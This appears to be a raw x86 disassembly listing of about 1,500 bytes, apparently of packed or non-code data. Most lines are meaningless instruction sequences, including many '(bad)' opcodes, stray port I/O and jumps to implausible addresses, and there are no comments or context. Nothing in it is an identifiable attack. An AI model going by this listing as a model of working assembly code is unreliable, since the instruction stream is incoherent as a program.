  430d5f:	mov    eax,0x203e8
  430d64:	add    al,ah
  430d66:	ror    BYTE PTR [eax+0xc007c0],0xc0
  430d6d:	add    dh,al
  430d6f:	add    ah,ch
  430d71:	rol    DWORD PTR [ebx-0x3595fb0d],1
  430d77:	pop    ecx
  430d78:	or     eax,ebx
  430d7a:	cli    
  430d7b:	add    BYTE PTR [ecx-0x4e728d1e],dh
  430d81:	lea    ebp,[ebx]
  430d83:	mov    edx,DWORD PTR [edx-0x4]
  430d86:	dec    ecx
  430d87:	inc    ebp
  430d88:	shr    BYTE PTR [ebx],0x4b
  430d8b:	and    al,0x0
  430d8d:	(bad)  
  430d8e:	jne    0x430dd5
  430d90:	pop    eax
  430d91:	mov    al,0x5a
  430d93:	call   0x1420ff2
  430d98:	and    al,0x85
  430d9a:	push   edx
  430d9b:	add    BYTE PTR [eax+eax*1+0x0],ah
  430d9f:	dec    ebp
  430da0:	mov    cl,0x23
  430da2:	jmp    0x430d90
  430da4:	mov    al,0xe7
  430da6:	call   0x1391094
  430dab:	shr    DWORD PTR [eax+ebx*2],cl
  430dae:	lock (bad) 
  430db0:	adc    eax,0x757f008d
  430db5:	out    0x58,eax
  430db7:	cmp    al,0x7
  430db9:	pop    edx
  430dba:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  430dc1:	push   ecx
  430dc2:	cld    
  430dc3:	mov    esi,0x3b0175
  430dc8:	and    al,0xb0
  430dca:	xor    BYTE PTR [edx+0x1],0x8b
  430dce:	add    ah,bh
  430dd0:	mov    edi,DWORD PTR [ebp-0x4]
  430dd3:	psubsw mm7,QWORD PTR [edi]
  430dd6:	add    DWORD PTR [ebp+0x0],ebp
  430dd9:	rcr    eax,1
  430ddb:	mov    edi,ecx
  430ddd:	and    eax,DWORD PTR [eax]
  430ddf:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  430de5:	call   0x13010ce
  430dea:	add    al,cl
  430dec:	mov    ebp,esi
  430dee:	aam    0x83
  430df0:	or     DWORD PTR [ecx],eax
  430df2:	jne    0x430de5
  430df4:	mov    eax,DWORD PTR [eax]
  430df6:	aam    0x0
  430df8:	dec    ebp
  430df9:	jne    0x430d86
  430dfb:	cmp    ebx,eax
  430dfd:	jb     0x430e4c
  430dff:	jmp    0x430d8c
  430e01:	mov    ebx,esp
  430e03:	int3   
  430e04:	dec    ebp
  430e05:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  430e0c:	mov    edx,0x8b0a8b
  430e11:	cmp    ecx,DWORD PTR [eax]
  430e13:	jb     0x430dec
  430e15:	pop    edx
  430e16:	push   edi
  430e17:	cli    
  430e18:	pop    es
  430e19:	mov    eax,ecx
  430e1b:	jb     0x430e1f
  430e1d:	add    DWORD PTR [ebx],0xa
  430e20:	mov    eax,DWORD PTR [ebx]
  430e22:	int3   
  430e23:	add    bh,BYTE PTR [esi+0x75d10006]
  430e29:	jmp    0x430db6
  430e2b:	mov    al,0xe8
  430e2d:	call   0x10410af
  430e32:	add    edx,DWORD PTR [ecx+ecx*8]
  430e35:	pop    edi
  430e36:	or     BYTE PTR [ecx-0x73],bl
  430e39:	pop    ecx
  430e3a:	inc    edi
  430e3b:	xor    al,0xeb
  430e3d:	push   ecx
  430e3e:	mov    edi,DWORD PTR [edx+0xc506cc]
  430e44:	call   0xb20f49
  430e49:	int3   
  430e4a:	sbb    BYTE PTR [esi],ch
  430e4c:	inc    ebp
  430e4d:	add    BYTE PTR [ebx-0x1f4f338b],cl
  430e53:	call   0x9c10c2
  430e58:	or     BYTE PTR [ebx-0x73],dl
  430e5b:	cmp    al,0x47
  430e5d:	mov    al,0x1
  430e5f:	jb     0x430e61
  430e61:	mov    al,0x10
  430e63:	push   eax
  430e64:	add    al,0x75
  430e66:	add    BYTE PTR [ebx],ch
  430e68:	add    ebx,esp
  430e6a:	int3   
  430e6b:	jne    0x430e7d
  430e6d:	movsx  edx,cl
  430e70:	add    DWORD PTR [eax],eax
  430e72:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  430e79:	mov    gs,edi
  430e7b:	add    BYTE PTR [eax-0x50],ch
  430e7e:	add    al,ch
  430e80:	mov    eax,DWORD PTR [ecx]
  430e82:	sub    eax,DWORD PTR [eax]
  430e84:	jb     0x430efb
  430e86:	add    DWORD PTR [esp+eiz*8-0x50],esi
  430e8a:	jge    0x430e74
  430e8c:	add    al,0x1
  430e8e:	add    DWORD PTR [eax],0x0
  430e91:	jne    0x430e93
  430e93:	je     0x430eda
  430e95:	mov    eax,DWORD PTR [edi]
  430e97:	ror    BYTE PTR [ebp+0x4d],1
  430e9a:	or     DWORD PTR [ecx+0x4d03d004],0x3
  430ea1:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  430ea7:	mov    DWORD PTR [ebx],ebp
  430ea9:	fadd   DWORD PTR [eax+0x75]
  430eac:	inc    eax
  430ead:	pop    eax
  430eae:	lea    ebx,[ecx+0x4f]
  430eb1:	push   0xb1000003
  430eb6:	out    dx,eax
  430eb7:	add    ebp,DWORD PTR [edx+edx*2]
  430eba:	add    BYTE PTR [ebx+ecx*4],bh
  430ebd:	mov    ch,BYTE PTR [ebx]
  430ebf:	jb     0x430f33
  430ec1:	add    al,0x89
  430ec3:	push   eax
  430ec4:	call   0x842b5c36
  430ec9:	add    DWORD PTR [eax+eax*1],eax
  430ecc:	jae    0x430ee2
  430ece:	icebp  
  430ecf:	inc    ebp
  430ed0:	mov    eax,DWORD PTR gs:[ecx]
  430ed3:	int3   
  430ed4:	out    dx,al
  430ed5:	loopne 0x430f24
  430ed7:	sub    eax,DWORD PTR [edx]
  430ed9:	push   0xffffff83
  430edb:	pop    esi
  430edc:	push   cs
  430edd:	jl     0x430ef8
  430edf:	add    al,0xaf
  430ee1:	xor    eax,0x832b6d00
  430ee6:	mov    eax,DWORD PTR [edx]
  430ee8:	rcr    BYTE PTR [ebp+0x754500dc],cl
  430eee:	ror    DWORD PTR [ebx+0x7dc8e803],1
  430ef4:	inc    ebp
  430ef5:	shr    ebx,0x3
  430ef8:	or     DWORD PTR [eax],0x4
  430efb:	push   0xffffffa5
  430efd:	pop    esi
  430efe:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  430f05:	jmp    0x430f64
  430f07:	mov    edi,0xff0272
  430f0c:	fdivr  QWORD PTR [ebp+0x5d]
  430f0f:	push   0x4e
  430f11:	pop    ecx
  430f12:	call   0x435317
  430f17:	mov    DWORD PTR [ebx],eax
  430f19:	in     al,0xc8
  430f1b:	rol    BYTE PTR [ebp-0x75],0xc1
  430f1f:	call   0xad1100
  430f24:	pop    esi
  430f25:	enter  0xceff,0x8b
  430f29:	repz mov ecx,DWORD PTR [ebp-0x34]
  430f2d:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  430f34:	je     0x430f36
  430f36:	or     DWORD PTR [ebx-0x74183b24],eax
  430f3c:	jne    0x430f22
  430f3e:	jmp    0x430f39
  430f40:	push   DWORD PTR [edx-0x24]
  430f43:	push   0x4d
  430f45:	pop    ecx
  430f46:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  430f4a:	jge    0x430f52
  430f4c:	mov    eax,eax
  430f4e:	sub    ebp,DWORD PTR [edx+0x24]
  430f51:	pop    esi
  430f52:	inc    ebp
  430f53:	mov    esp,0x8b6077
  430f58:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  430f5e:	lods   al,BYTE PTR ds:[esi]
  430f5f:	add    BYTE PTR [ebx],bh
  430f61:	enter  0xce73,0x49
  430f65:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  430f6d:	stc    
  430f6e:	jge    0x430fe2
  430f70:	jnp    0xdd4292df
  430f76:	call   0xc6104c
  430f7b:	fadd   st(0),st
  430f7d:	dec    esi
  430f7e:	ins    BYTE PTR es:[edi],dx
  430f7f:	stc    
  430f80:	cmp    al,0x73
  430f82:	push   ebp
  430f83:	mov    eax,0xf8028b
  430f88:	jne    0x430f4b
  430f8a:	mov    esi,ecx
  430f8c:	mov    esp,DWORD PTR [ebp+0x2c]
  430f8f:	add    edi,DWORD PTR [ebp-0x24]
  430f92:	sub    esp,eax
  430f94:	and    al,0x45
  430f96:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  430f9c:	sbb    al,0xee
  430f9e:	pop    esi
  430f9f:	call   0x830fcf
  430fa4:	fsubr  st,st(3)
  430fa6:	sti    
  430fa7:	add    BYTE PTR gs:[ecx],bh
  430faa:	add    eax,esp
  430fac:	add    DWORD PTR [esi],eax
  430fae:	rol    DWORD PTR [ebp+0x8],0x29
  430fb2:	mov    esp,eax
  430fb4:	clc    
  430fb5:	jne    0x43102c
  430fb7:	mov    eax,0x8b0673
  430fbc:	loopne 0x431003
  430fbe:	loopne 0x430f49
  430fc0:	lods   al,BYTE PTR ds:[esi]
  430fc1:	int3   
  430fc2:	inc    ebp
  430fc3:	mov    DWORD PTR gs:[eax+edi*8],eax
  430fc7:	add    al,0xc3
  430fc9:	sub    ecx,DWORD PTR [ebp+0x47]
  430fcc:	(bad)  
  430fce:	shr    BYTE PTR [ebp-0x1f],0xe8
  430fd2:	add    eax,DWORD PTR [eax]
  430fd4:	call   0x644d0d9
  430fd9:	add    esi,DWORD PTR [esi-0x3b2efc83]
  430fdf:	dec    esi
  430fe0:	ins    DWORD PTR es:[edi],dx
  430fe1:	in     al,dx
  430fe2:	lea    eax,[eax]
  430fe4:	inc    ebp
  430fe5:	inc    ebp
  430fe6:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  430fec:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  430ff6:	and    al,0xdc
  430ff8:	ror    DWORD PTR [edx+0x24],0xf7
  430ffc:	or     BYTE PTR [ebp+0x4c],dh
  430fff:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  431003:	stos   BYTE PTR es:[edi],al
  431004:	adc    edx,edi
  431006:	inc    esp
  431007:	add    edi,DWORD PTR [eax]
  431009:	jne    0x430fee
  43100b:	mov    DWORD PTR [eax-0x7449db04],ecx
  431011:	cmp    ecx,DWORD PTR [edi]
  431013:	sub    BYTE PTR [ebp-0x7e],dl
  431016:	sar    ebp,0xb
  431019:	jmp    FWORD PTR [edi+0x2400392a]
  43101f:	sub    esi,DWORD PTR [ebx-0x73]
  431022:	mov    esp,DWORD PTR [ecx+edi*4]
  431025:	mov    ecx,DWORD PTR [eax]
  431027:	and    BYTE PTR [eax],al
  431029:	jne    0x430ff5
  43102b:	sub    ebp,ecx
  43102d:	sbb    BYTE PTR [esi+0x32],ah
  431030:	dec    ebp
  431031:	push   ebp
  431032:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  431038:	ret    
  431039:	mov    edx,ebp
  43103b:	leave  
  43103c:	sub    DWORD PTR [esi+0x24],ebx
  43103f:	ret    0x2b
  431042:	pop    ax
  431044:	push   ebp
  431045:	rol    BYTE PTR [ebx],0xeb
  431048:	add    DWORD PTR [ecx+0x6c0001],0x40
  43104f:	jb     0x4310a6
  431051:	ret    
  431052:	in     al,dx
  431053:	jecxz  0x430fe0
  431055:	push   esi
  431056:	xchg   esp,eax
  431057:	jne    0x431059
  431059:	cmp    edx,DWORD PTR [esi+0x1c]
  43105c:	jne    0x431042
  43105e:	mov    eax,DWORD PTR [ebp-0x77]
  431061:	ror    DWORD PTR [ebx+0x899408],0xe0
  431068:	mov    esi,DWORD PTR [ebp-0x75]
  43106b:	pop    esi
  43106c:	nop
  43106d:	mov    eax,DWORD PTR [eax]
  43106f:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  431075:	add    al,0x0
  431077:	inc    ebp
  431078:	mov    eax,DWORD PTR [ebx]
  43107a:	mov    ebp,ebx
  43107c:	cmp    al,0xf
  43107e:	or     al,al
  431080:	inc    ebp
  431081:	inc    ebp
  431082:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  431088:	cld    
  431089:	add    BYTE PTR [edi+0x546c16c0],dh
  43108f:	add    BYTE PTR [ecx-0x5],dl
  431092:	add    eax,0x17200
  431097:	sbb    al,0x85
  431099:	dec    esp
  43109a:	je     0x4310d4
  43109c:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  4310a0:	add    BYTE PTR [ebx],bh
  4310a2:	(bad)  
  4310a3:	and    al,0x32
  4310a5:	jae    0x431043
  4310a7:	mov    cl,cl
  4310a9:	inc    DWORD PTR [esp]
  4310ac:	push   ebp
  4310ad:	shr    esp,0x8
  4310b0:	in     al,dx
  4310b1:	push   esp
  4310b2:	add    DWORD PTR [eax],esp
  4310b4:	add    bl,cl
  4310b6:	inc    ebp
  4310b7:	mov    bh,0x89
  4310b9:	add    ah,bh
  4310bb:	jmp    0xca752005
  4310c0:	pushf  
  4310c1:	dec    esp
  4310c2:	mov    edx,0xf8178520
  4310c7:	fst    DWORD PTR [ebp+0x0]
  4310ca:	mov    BYTE PTR [eax],0xc4
  4310cd:	sub    edx,DWORD PTR [ebx-0x3f]
  4310d0:	inc    ebp
  4310d1:	add    eax,0xc601da
  4310d6:	mov    al,0xc6
  4310d9:	ins    BYTE PTR es:[edi],dx
  4310da:	mov    DWORD PTR [eax+0x57],0x2c0545c1
  4310e1:	dec    esp
  4310e2:	jmp    DWORD PTR [eax]
  4310e4:	inc    ebp
  4310e5:	fnstcw WORD PTR [esi+0x29]
  4310e8:	test   BYTE PTR [eax],0xc8
  4310eb:	rol    BYTE PTR [eax],0xc0
  4310ee:	lea    ecx,[ebp-0x3cf0dbcb]
  4310f4:	sbb    BYTE PTR [ebx-0x75fcae0d],cl
  4310fa:	inc    esi
  4310fb:	add    DWORD PTR [eax],ebx
  4310fd:	add    dh,bh
  4310ff:	mov    esi,DWORD PTR [edx+0x8]
  431102:	(bad)  
  431103:	fdiv   QWORD PTR ss:[ecx]
  431106:	(bad)  
  431107:	mov    bl,ch
  431109:	add    esi,eax
  43110b:	add    dh,bl
  43110d:	or     esi,eax
  43110f:	mov    dl,0xdf
  431111:	add    esi,eax
  431113:	add    al,ah
  431115:	push   cs
  431116:	mov    BYTE PTR [edx+0xc601e1],0xe2
  43111d:	or     BYTE PTR [ebx],dh
  43111f:	dec    ecx
  431120:	lea    eax,[ebx]
  431122:	xor    eax,0x18fc0fc7
  431127:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431128:	repz clc 
  43112a:	add    eax,DWORD PTR [ebp+0x46]
  43112d:	prefetcht0 BYTE PTR [ecx-0x2]
  431131:	xor    eax,0x7c60872
  431136:	mov    esp,0xbd32c69b
  43113b:	pop    esi
  43113c:	mov    cl,0xbe
  43113f:	or     al,0xc6
  431141:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  431148:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  43114f:	add    dh,al
  431151:	mov    eax,ebx
  431153:	xor    DWORD PTR [ebx],0x35008dbc
  431159:	mov    ecx,DWORD PTR [edi]
  43115b:	sbb    al,0x18
  43115d:	inc    ebp
  43115e:	xrelease mov DWORD PTR [ebx],0x188546f4
  431165:	clc    
  431166:	(bad)  
  431167:	xor    DWORD PTR [edx-0x64],esi
  43116a:	lea    ecx,[ecx+0x45ffe838]
  431170:	mov    ecx,ebx
  431172:	fadd   st,st(6)
  431174:	dec    ebp
  431175:	lds    edi,FWORD PTR [eax+0x7145fc56]
  43117b:	out    0x1,eax
  43117d:	inc    ebp
  43117e:	lea    ebp,ds:0xc8ffc6ff
  431184:	enter  0xa33,0xc6
  431188:	push   ebp
  431189:	leave  
  43118a:	(bad)  
  43118b:	xor    edi,DWORD PTR [eax-0x7ff7a47]
  431191:	add    BYTE PTR [ebp+0x44],al
  431194:	mov    eax,esp
  431196:	mov    WORD PTR [esi+0x46398300],?
  43119c:	psubusw mm4,QWORD PTR [esi-0x78]
  4311a0:	add    BYTE PTR [ebx-0x1303f975],al
  4311a6:	add    BYTE PTR [ebp+0x1],0xeb
  4311aa:	add    BYTE PTR [ebp+0x38],al
  4311ad:	in     eax,dx
  4311ae:	inc    ebp
  4311af:	inc    ebp
  4311b0:	mov    ebx,ebx
  4311b2:	add    BYTE PTR [ebp+0x0],0xec
  4311b6:	mov    DWORD PTR [ebp-0x41],eax
  4311b9:	sub    eax,0x2c00454e
  4311be:	ins    DWORD PTR es:[edi],dx
  4311bf:	inc    ebp
  4311c0:	add    BYTE PTR [esi+0x66],bh
  4311c3:	test   BYTE PTR [ebp-0x2300bc],0xb6
  4311ca:	mov    DWORD PTR [ebx-0x2699b977],0x83b888ff
  4311d4:	dec    edi
  4311d5:	pop    es
  4311d6:	add    ah,ch
  4311d8:	mov    DWORD PTR [ebp+0x68],eax
  4311db:	in     eax,dx
  4311dc:	inc    DWORD PTR [ebp-0x7d]
  4311df:	out    0xc0,al
  4311e1:	inc    ebp
  4311e2:	mov    edx,esp
  4311e4:	push   0x45
  4311e6:	(bad)  
  4311e7:	jmp    0xdf9257a4
  4311ec:	add    BYTE PTR [ebp-0x77],al
  4311ef:	out    dx,al
  4311f0:	ins    BYTE PTR es:[edi],dx
  4311f1:	inc    ebp
  4311f2:	jmp    edi
  4311f4:	add    DWORD PTR [ebp-0x14],0x7e
  4311f8:	mov    esi,esi
  4311fa:	outs   dx,BYTE PTR ds:[esi]
  4311fb:	inc    esp
  4311fc:	(bad)  
  4311fd:	mov    esp,0x8341b68d
  431202:	mov    DWORD PTR [esi+0x70],eax
  431205:	fcos   
  431207:	mov    BYTE PTR [ebx-0x76f7ca7d],al
  43120d:	in     al,dx
  43120e:	jb     0x431195
  431210:	(bad)  
  431211:	dec    DWORD PTR [ebx-0x7aba9901]
  431217:	mov    edi,edi
  431219:	fdivr  st,st(7)
  43121b:	out    dx,eax
  43121c:	rcl    BYTE PTR [ebx],0x66
  43121f:	mov    DWORD PTR [ebp-0xc70075],eax
  431225:	(bad)  
  431226:	std    
  431227:	cmp    eax,DWORD PTR [eax]
  431229:	jne    0x431291
  43122b:	mov    DWORD PTR [ebp-0xba0048],eax
  431231:	in     al,dx
  431232:	outs   dx,BYTE PTR ds:[esi]
  431233:	pushf  
  431234:	add    BYTE PTR [ebx-0x7f7a039a],cl
  43123a:	inc    DWORD PTR [ecx]
  43123c:	inc    DWORD PTR [eax]
  43123e:	jae    0x431278
  431240:	add    BYTE PTR [ebp+0x850266],al
  431246:	inc    DWORD PTR [ebp-0x1]
  431249:	mov    eax,eax
  43124b:	jl     0x4312b3
  43124d:	add    BYTE PTR [ebp-0x740077],al
  431253:	cld    
  431254:	dec    eax
  431255:	add    BYTE PTR [eax],0x1
  431258:	data16 add BYTE PTR [ebp+0x38],al
  43125c:	mov    eax,0x47c2
  431261:	mov    eax,0x824f89
  431266:	inc    edi
  431267:	mov    DWORD PTR [edx+0x64],ebp
  43126a:	inc    WORD PTR [ebp-0x75]
  43126e:	(bad)  
  43126f:	data16 rol BYTE PTR [ebp-0x16001a],1
  431276:	inc    ebp
  431277:	jge    0x431258
  431279:	add    bh,ah
  43127b:	lea    ax,[ebp-0x750030]
  431282:	add    al,0x46
  431285:	jmp    0x40ff:0x8885
  43128b:	push   DWORD PTR [ebp+0x52]
  43128e:	lea    eax,[eax]
  431290:	shl    BYTE PTR [esi-0x7b],1
  431293:	test   esi,edi
  431295:	(bad)  
  431296:	(bad)  
  431297:	inc    DWORD PTR [ebp-0x990140]
  43129d:	test   DWORD PTR [ebx+0x54fff4ff],ecx
  4312a3:	inc    edi
  4312a4:	push   ecx
  4312a5:	xor    ax,WORD PTR [ebp-0x8d0045]
  4312ac:	add    al,al
  4312ae:	ret    
  4312af:	mov    ax,WORD PTR [ebp-0x3f0004]
  4312b6:	push   eax
  4312b7:	mov    DWORD PTR [ebp-0x77],0xff98748b
  4312be:	add    BYTE PTR [ebx-0x764f8839],al
  4312c4:	push   DWORD PTR [esi+0x1]
  4312c7:	inc    DWORD PTR [eax]
  4312c9:	mov    eax,0xff99ff
  4312ce:	or     BYTE PTR [ecx-0x7a87bb],cl
  4312d4:	jne    0x43128e
  4312d6:	add    DWORD PTR [edx-0x76edff71],0xff707a8e
  4312e0:	mov    ecx,0xd74fb8
  4312e5:	add    cl,al
  4312e7:	mov    DWORD PTR [ecx-0x3f007784],ecx
  4312ed:	or     DWORD PTR [ebx+0x558966dc],0x7e
  4312f4:	(bad)  
  4312f5:	push   ebp
  4312f7:	mov    eax,0x8c2789
  4312fc:	ret    0x6689
  4312ff:	adc    BYTE PTR [ebp+0x48],0x8d
  431303:	add    bh,ah
  431305:	mov    WORD PTR [ebp-0x70],ax
  431309:	(bad)  
  43130a:	ret    0x667d
  43130d:	or     BYTE PTR [ebp-0x77],dl
  431310:	lea    eax,[ecx+eiz*8-0x6b1276bb]
  431317:	loop   0x4312a2
  431319:	(bad)  
  43131a:	xchg   esi,eax
  43131b:	aam    0xcf
  43131d:	out    dx,al
  43131e:	mov    DWORD PTR [esi-0x68],edi
  431321:	inc    ebp
  431322:	dec    edx
  431323:	pop    ecx
  431324:	mov    edx,DWORD PTR [eax]
  431326:	repnz push bp
  431329:	or     BYTE PTR [ebx+0x55106638],0x49
  431330:	(bad)  
  431331:	repnz xor eax,0xa0898945
  431337:	mov    ah,0x89
  431339:	jmp    DWORD PTR [edx+0x66b0418d]
  43133f:	inc    DWORD PTR [ebp+0x50]
  431342:	add    DWORD PTR [ebp-0x5],0xffffffbe
  431346:	mov    DWORD PTR [eax],ecx
  431348:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431349:	pop    es
  43134a:	inc    ecx
  43134b:	(bad)  
  43134c:	data16 fwait
  43134e:	inc    ebp
  43134f:	xor    ah,BYTE PTR [esi+0x3]
  431352:	dec    ebp
  431353:	push   eax
  431354:	inc    bp
  431356:	jge    0x4312db
  431358:	mov    esp,DWORD PTR [esi-0x18]
  43135b:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  431361:	add    DWORD PTR [ebx],esi
  431363:	add    BYTE PTR [ebx],al
  431365:	test   DWORD PTR [ebx],esi
  431367:	(bad)  
  431368:	inc    WORD PTR [ebp+0x0]
  43136c:	mov    eax,DWORD PTR [eax]
  43136e:	call   0x8898caa3
  431373:	mov    esi,eax
  431375:	clc    
  431376:	ret    
  431377:	rol    cl,0xa
  43137a:	mov    DWORD PTR ds:0x7c0ec88,esi
  431380:	mov    edx,edi
  431382:	pushf  
  431383:	pop    es
  431384:	jmp    FWORD PTR [edx+0x66]
  431387:	add    BYTE PTR [ebp-0x990175],al
  43138d:	inc    ebp
  43138e:	test   DWORD PTR [ebx-0x2f00f202],eax
  431394:	push   ebp
  431395:	mov    edi,eax
  431397:	mov    dh,BYTE PTR [eax+0x266ff51]
  43139d:	push   ebp
  43139e:	add    BYTE PTR [ebx-0x764b0777],al
  4313a4:	dec    DWORD PTR [esi+0x661851e8]
  4313aa:	add    BYTE PTR [ebp-0x7b],dl
  4313ad:	cmp    esi,0xfffffffb
  4313b0:	dec    DWORD PTR [ecx+0x51fe9285]
  4313b6:	jmp    DWORD PTR [esi-0x75]
  4313b9:	push   ebp
  4313ba:	hlt    
  4313bb:	data16 (bad) 
  4313bd:	dec    ebp
  4313be:	ret    
  4313bf:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  4313c5:	lea    edx,[eax-0x1]
  4313c8:	jne    0x43139b
  4313ca:	dec    DWORD PTR [ecx-0x2f7a63f8]
  4313d0:	dec    BYTE PTR [ecx+0x51559eff]
  4313d6:	mov    DWORD PTR [esi-0x4c],esp
  4313d9:	push   ebp
  4313da:	jmp    DWORD PTR [esi-0x18]
  4313dd:	inc    ebp
  4313de:	sbb    BYTE PTR [ebp-0x767ad900],cl
  4313e4:	(bad)  
  4313e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4313e6:	inc    eax
  4313e8:	test   DWORD PTR [esi-0x2],esp
  4313eb:	inc    ebp
  4313ec:	dec    DWORD PTR [ebp-0x760bde75]
  4313f2:	(bad)  
  4313f3:	test   al,0xc3
  4313f5:	mov    DWORD PTR [ebp-0x769b56],ecx
  4313fb:	lods   al,BYTE PTR ds:[esi]
  4313fc:	push   eax
  4313fd:	inc    ebp
  4313fe:	jne    0x43140f
  431400:	dec    DWORD PTR [ebp+0x8]
  431403:	mov    ecx,DWORD PTR [ebx]
  431405:	sbb    al,0x0
  431407:	(bad)  
  431408:	mov    eax,0xc14fc3
  43140d:	mov    DWORD PTR [ecx-0xbabf64],ecx
  431413:	movsx  ecx,WORD PTR [ebp+0x4e]
  431417:	xor    eax,DWORD PTR [eax]
  431419:	add    eax,edi
  43141b:	xor    ecx,DWORD PTR [ecx-0xbabd9a]
  431421:	xor    edi,DWORD PTR [eax+0x854f66]
  431427:	dec    BYTE PTR [ecx-0x76bb01]
  43142d:	mov    BYTE PTR [ebx-0x76724001],al
  431433:	pushf  
  431434:	inc    esi
  431435:	(bad)  
  431436:	dec    DWORD PTR [ebp-0x7abe6373]
  43143c:	sar    esi,0x89
  43143f:	dec    DWORD PTR [eax+0x0]
  431442:	inc    DWORD PTR [eax]
  431444:	add    DWORD PTR [ebp-0x2f01cb],0xffffff89
  43144b:	xlat   BYTE PTR ds:[ebx]
  43144c:	dec    edx
  43144d:	add    bh,bh
  43144f:	mov    DWORD PTR [ebp-0x3e00ac48],ecx
  431455:	lea    esp,[esi-0x50]
  431458:	(bad)  
  431459:	(bad)  
  43145a:	call   DWORD PTR [eax-0x1]
  43145d:	inc    ebp
  43145e:	rdpmc  
  431460:	add    BYTE PTR [ebx],al
  431462:	push   ax
  431464:	lea    eax,[ebp-0x1]
  43146a:	js     0x43146b
  43146c:	add    al,bh
  43146e:	push   bp
  431470:	lea    ecx,[ebp-0x7701]
  431476:	fmul   DWORD PTR [ebp-0x7a997800]
  43147c:	(bad)  
  43147d:	(bad)  
  43147e:	(bad)  
  43147f:	(bad)  
  431480:	jmp    DWORD PTR [ecx-0x7676ffb3]
  431486:	dec    eax
  431487:	mov    eax,0x8d8dffff
  43148c:	mov    al,0xb0
  43148e:	(bad)  
  43148f:	call   DWORD PTR [ecx+0x50]
  431492:	dec    ebp
  431493:	inc    ebp
  431494:	mov    esi,0x7030833
  431499:	push   eax
  43149a:	into   
  43149b:	test   DWORD PTR [ebx+0x3ff32ff],ebx
  4314a1:	call   DWORD PTR [ecx-0x8]
  4314a4:	lea    edx,[ebp-0x1]
  4314a7:	jmp    0x7616ab
  4314ac:	inc    eax
  4314ad:	jnp    0x43143c
  4314af:	add    dh,bh
  4314b1:	inc    WORD PTR [ebp-0x8a00b0]
  4314b8:	mov    edx,eax
  4314ba:	inc    esp
  4314bb:	add    bh,bh
  4314bd:	mov    ecx,DWORD PTR [ecx-0x7a4f9a]
  4314c3:	dec    DWORD PTR [ebx-0x7f820301]
  4314c9:	add    BYTE PTR [ecx],al
  4314cb:	data16 add BYTE PTR [ebp-0xb30077],al
  4314d2:	inc    eax
  4314d4:	(bad)  
  4314d5:	dec    si
  4314d7:	test   edi,edi
  4314d9:	(bad)  
  4314da:	cmp    edi,edi
  4314dc:	add    ecx,DWORD PTR [edi-0x39]
  4314df:	mov    edx,DWORD PTR [edx+0x66]
  4314e2:	inc    DWORD PTR [ebp-0x3d00cb]
  4314e8:	mov    eax,0x66ff8b5e
  4314ee:	jmp    0xb4ff:0xc7ff3895
  4314f5:	push   ecx
  4314f6:	inc    DWORD PTR [ebx-0x76ffccbb]
  4314fc:	call   DWORD PTR [esi-0x1]
  4314ff:	dec    DWORD PTR [eax]
  431501:	mov    ecx,0x805ff
  431506:	inc    ebp
  431507:	mov    DWORD PTR [ebx-0x3f00e3a8],ecx
  43150d:	mov    ecx,0x35784
  431512:	add    BYTE PTR [ecx-0xffa59b],cl
  431518:	inc    ebp
  431519:	mov    ecx,0x9c6131
  43151e:	(bad)  
  43151f:	mov    eax,ebx
  431521:	pop    esp
  431522:	test   edi,edi
  431524:	clc    
  431525:	lea    eax,[ebp-0x24]
  431528:	cmp    eax,0xc7fe9c8d
  43152d:	push   eax
  43152f:	lea    eax,[ebp+0x45fff8fe]
  431535:	mov    esi,DWORD PTR [ecx]
  431537:	hlt    
  431538:	lahf   
  431539:	push   esp
  43153a:	mov    edx,DWORD PTR [ecx-0x4]
  43153d:	xor    eax,DWORD PTR [eax+0x7201bb]
  431543:	add    BYTE PTR [ebp-0x35],al
  431546:	mov    ecx,DWORD PTR [ebp-0xb2bf04]
  43154c:	mov    edx,DWORD PTR [ecx-0x74]
  43154f:	rol    BYTE PTR [eax],0x8d
  431552:	mov    eax,DWORD PTR [ebx+ecx*4-0x1]
  431556:	nop
  431557:	push   ecx
  431558:	add    bh,bh
  43155a:	mov    esp,edi
  43155c:	in     al,0x85
  43155e:	jge    0x43155e
  431560:	test   edi,edi
  431562:	jne    0x4314e9
  431564:	(bad)  
  431565:	(bad)  
  431566:	sbb    bh,bh
  431568:	push   ebp
  431569:	inc    ebp
  43156a:	call   0xffdc0ffa
  43156f:	add    BYTE PTR [ebp+0x66],al
  431572:	mov    edx,DWORD PTR [ebp-0xfc0075]
  431578:	cmp    al,0x85
  43157a:	ud0    eax,DWORD PTR [ebp-0x1]
  43157e:	test   DWORD PTR [edi+0x74],ecx
  431581:	dec    edi
  431582:	inc    DWORD PTR [ebp-0x50004]
  431588:	dec    DWORD PTR [edi-0x75]
  43158b:	dec    esi
  43158c:	cld    
  43158d:	test   DWORD PTR [eax+0xff01ff],eax
  431593:	icebp  
  431594:	add    BYTE PTR [edi-0x3a],cl
  431597:	test   ebx,eax
  431599:	inc    BYTE PTR [ebp-0x1]
  43159c:	jne    0x43159e
  43159e:	mov    eax,DWORD PTR [eax]
  4315a0:	cld    
  4315a1:	xor    BYTE PTR [ecx+0x500155],cl
  4315a7:	push   ebp
